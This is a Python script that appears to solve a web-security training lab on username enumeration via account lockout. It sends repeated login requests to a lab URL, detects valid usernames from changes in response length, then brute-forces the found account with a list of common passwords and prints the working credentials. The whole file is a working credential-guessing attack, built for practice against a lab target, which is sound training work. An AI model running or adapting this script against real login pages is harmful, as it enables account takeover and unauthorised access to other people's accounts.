import requests

# Username enumeration via account lock

# to solve this lab U can know the valid username by brute force usernames , valid usernames blocked after 4 attemps
#

usernames = [
    "carlos", "root", "admin", "test", "guest", "info", "adm", "mysql", "user",
    "administrator", "oracle", "ftp", "pi", "puppet", "ansible", "ec2-user",
    "vagrant", "azureuser", "academico", "acceso", "access", "accounting",
    "accounts", "acid", "activestat", "ad", "adam", "adkit", "admin",
    "administracion", "administrador", "administrator", "administrators",
    "admins", "ads", "adserver", "adsl", "ae", "af", "affiliate", "affiliates",
    "afiliados", "ag", "agenda", "agent", "ai", "aix", "ajax", "ak", "akamai",
    "al", "alabama", "alaska", "albuquerque", "alerts", "alpha", "alterwind",
    "am", "amarillo", "americas", "an", "anaheim", "analyzer", "announce",
    "announcements", "antivirus", "ao", "ap", "apache", "apollo", "app",
    "app01", "app1", "apple", "application", "applications", "apps",
    "appserver", "aq", "ar", "archie", "arcsight", "argentina", "arizona",
    "arkansas", "arlington", "as", "as400", "asia", "asterix", "at", "athena",
    "atlanta", "atlas", "att", "au", "auction", "austin", "auth", "auto",
    "autodiscover"
]
passwords = [
    "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234",
    "111111", "1234567", "dragon", "123123", "baseball", "abc123", "football",
    "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop", "123321",
    "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx",
    "7777777", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1",
    "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer",
    "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000",
    "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars",
    "klaster", "112233", "george", "computer", "michelle", "jessica", "pepper",
    "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777",
    "pass", "maggie", "159753", "aaaaaa", "ginger", "princess", "joshua",
    "cheese", "amanda", "summer", "love", "ashley", "nicole", "chelsea",
    "biteme", "matthew", "access", "yankees", "987654321", "dallas", "austin",
    "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor", "monitoring",
    "montana", "moon", "moscow"
]


url = "https://0a82007f03a860af81a2b14b00450011.web-security-academy.net/login"

data = {
    "username": "carlos",
    "password": "peter"
}
reqNum=1
i=1

for user in usernames:
    data['username'] = user
    # here two loop to know the right user
    for  i in range(0,4):
        respone = requests.post(url=url, data=data)
        print(respone.status_code)
        print(len(respone.text))
        if len(respone.text) != 3132:
            print(f"valid user :{user}")
            # after know the valid password brute force passwords

            for passorrd in passwords:
                data['password'] = passorrd
                respone = requests.post(url=url, data=data)

                if "Invalid username or password." not in respone.text and "You have made too many incorrect login attempts. Please try again in 1 minute(s)." not in respone.text:
                    print(f"username:{user} && password:{passorrd}")
                    exit()





